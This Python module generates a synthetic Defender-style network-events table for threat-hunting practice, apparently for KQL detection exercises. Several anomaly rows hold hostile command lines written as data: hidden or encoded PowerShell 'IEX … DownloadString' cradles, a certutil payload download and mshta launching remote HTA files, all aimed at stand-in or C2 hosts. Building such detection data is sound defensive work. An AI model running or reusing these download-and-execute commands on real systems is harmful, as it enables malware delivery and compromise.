"""Synthetic dataset mimicking a simplified Microsoft Defender for Endpoint
`DeviceNetworkEvents` table: benign outbound connections plus a handful of
callbacks to the same C2 IP already used in `device_process_events.py`'s
anomalous command lines, so the two tables can be correlated by device/time.

Generation is fully deterministic (no `random` module involved), matching the
convention in `device_process_events.py`/`device_logon_events.py`.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any

from core.kql_engine.ast_nodes import KqlType

from .schema import ColumnSchema, TableSchema

SCHEMA = TableSchema(
    name="DeviceNetworkEvents",
    columns=[
        ColumnSchema("Timestamp", KqlType.DATETIME, "Czas nawiązania połączenia (UTC)."),
        ColumnSchema("DeviceName", KqlType.STRING, "Nazwa hosta."),
        ColumnSchema("ActionType", KqlType.STRING, "W tym zbiorze zawsze 'ConnectionSuccess'."),
        ColumnSchema("RemoteIP", KqlType.STRING, "Docelowy adres IP."),
        ColumnSchema("RemotePort", KqlType.LONG, "Docelowy port."),
        ColumnSchema("RemoteUrl", KqlType.STRING, "Docelowy URL/domena, jeśli znana."),
        ColumnSchema("Protocol", KqlType.STRING, "'Tcp' lub 'Udp'."),
        ColumnSchema("InitiatingProcessFileName", KqlType.STRING, "Proces, który nawiązał połączenie."),
        ColumnSchema(
            "InitiatingProcessCommandLine", KqlType.STRING, "Linia poleceń procesu inicjującego połączenie."
        ),
    ],
)

_BASE_TIME = datetime(2026, 8, 10, 8, 0, 0, tzinfo=timezone.utc)
_DEVICES = ["WIN-CLIENT01", "WIN-CLIENT02", "WIN-CLIENT03", "WIN-SRV01", "WIN-SRV02"]

_BENIGN_TARGETS: list[tuple[str, int, str, str]] = [
    ("142.250.203.14", 443, "www.google.com", "chrome.exe"),
    ("52.113.194.132", 443, "teams.microsoft.com", "Teams.exe"),
    ("13.107.6.156", 443, "outlook.office365.com", "OUTLOOK.EXE"),
    ("13.107.42.14", 443, "onedrive.live.com", "OneDrive.exe"),
    ("20.190.128.1", 443, "login.microsoftonline.com", "explorer.exe"),
]

# Reuses the C2 IP from device_process_events.py's anomalies - each row here
# lines up with a specific process-execution anomaly on the same device at
# (about) the same timestamp, so a future scenario can join the two tables.
_ANOMALIES: list[dict[str, Any]] = [
    {
        # matches WIN-CLIENT02's encoded powershell.exe anomaly (+2h13m)
        "Timestamp": _BASE_TIME + timedelta(hours=2, minutes=14),
        "DeviceName": "WIN-CLIENT02",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.220.101.5",
        "RemotePort": 443,
        "RemoteUrl": "evil.example",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            "powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAC4AcABzADEAJwApAA=="
        ),
    },
    {
        # matches WIN-CLIENT01's cmd->powershell anomaly (+3h5m)
        "Timestamp": _BASE_TIME + timedelta(hours=3, minutes=6),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.220.101.5",
        "RemotePort": 80,
        "RemoteUrl": "185.220.101.5",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            r'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient)'
            r".DownloadString('http://185.220.101.5/stage2.ps1')\""
        ),
    },
    {
        # matches WIN-SRV01's certutil anomaly (+5h12m)
        "Timestamp": _BASE_TIME + timedelta(hours=5, minutes=13),
        "DeviceName": "WIN-SRV01",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.220.101.5",
        "RemotePort": 80,
        "RemoteUrl": "185.220.101.5",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "certutil.exe",
        "InitiatingProcessCommandLine": (
            r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe"
        ),
    },
    {
        # matches WIN-CLIENT02's mshta anomaly (+7h25m)
        "Timestamp": _BASE_TIME + timedelta(hours=7, minutes=26),
        "DeviceName": "WIN-CLIENT02",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.220.101.5",
        "RemotePort": 80,
        "RemoteUrl": "185.220.101.5",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "mshta.exe",
        "InitiatingProcessCommandLine": "mshta.exe http://185.220.101.5/invoice.hta",
    },
    {
        # C2 beacon from the Faktura_Zalegla_Setup.exe installer anomaly in
        # device_process_events.py (+10h) - a separate campaign/infra from
        # the 185.220.101.5 anomalies above.
        "Timestamp": _BASE_TIME + timedelta(hours=10, minutes=1),
        "DeviceName": "WIN-CLIENT01",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "195.201.57.82",
        "RemotePort": 443,
        "RemoteUrl": "195.201.57.82",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "Faktura_Zalegla_Setup.exe",
        "InitiatingProcessCommandLine": r"C:\Users\Public\Downloads\Faktura_Zalegla_Setup.exe /S",
    },
    {
        # matches WIN-CLIENT06's LummaC2 PowerShell dropper anomaly (+15h1m)
        "Timestamp": _BASE_TIME + timedelta(hours=15, minutes=2),
        "DeviceName": "WIN-CLIENT06",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.53.90.14",
        "RemotePort": 443,
        "RemoteUrl": "guaicui.com.br",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessCommandLine": (
            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
            r"\"IEX(New-Object Net.WebClient).DownloadString("
            r"'http://guaicui.com.br/languages/es.txt')\""
        ),
    },
    {
        # INC-7936-style TA569 drive-by/SEO-poisoning beacon - blocked before
        # any payload executed, so this is a bare network callback with no
        # matching DeviceProcessEvents anomaly (chrome.exe itself is benign;
        # the injected JS never got the chance to drop a real payload).
        "Timestamp": _BASE_TIME + timedelta(hours=17),
        "DeviceName": "WIN-CLIENT07",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "176.53.147.97",
        "RemotePort": 443,
        "RemoteUrl": "176.53.147.97",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessCommandLine": "chrome.exe",
    },
    {
        "Timestamp": _BASE_TIME + timedelta(hours=17, minutes=5),
        "DeviceName": "WIN-CLIENT08",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "185.159.129.211",
        "RemotePort": 443,
        "RemoteUrl": "loopconstruct.com",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessCommandLine": "chrome.exe",
    },
    {
        # matches WIN-CLIENT09's theatercraft.buzz mshta anomaly in
        # device_process_events.py (+16h) - rotating hex subdomain (DGA-style)
        "Timestamp": _BASE_TIME + timedelta(hours=16, minutes=1),
        "DeviceName": "WIN-CLIENT09",
        "ActionType": "ConnectionSuccess",
        "RemoteIP": "91.229.23.44",
        "RemotePort": 443,
        "RemoteUrl": "977381d3.theatercraft.buzz",
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "mshta.exe",
        "InitiatingProcessCommandLine": r'mshta.exe "C:\Users\kwojcik\Downloads\cheatsheet.hta"',
    },
]


def _benign_rows(count: int) -> list[dict[str, Any]]:
    rows = []
    for i in range(count):
        device = _DEVICES[i % len(_DEVICES)]
        remote_ip, port, url, process = _BENIGN_TARGETS[i % len(_BENIGN_TARGETS)]
        rows.append(
            {
                "Timestamp": _BASE_TIME + timedelta(minutes=i * 4),
                "DeviceName": device,
                "ActionType": "ConnectionSuccess",
                "RemoteIP": remote_ip,
                "RemotePort": port,
                "RemoteUrl": url,
                "Protocol": "Tcp",
                "InitiatingProcessFileName": process,
                "InitiatingProcessCommandLine": process,
            }
        )
    return rows


def _build_rows() -> list[dict[str, Any]]:
    rows = _benign_rows(90) + _ANOMALIES
    rows.sort(key=lambda r: r["Timestamp"])
    return rows


ROWS: list[dict[str, Any]] = _build_rows()
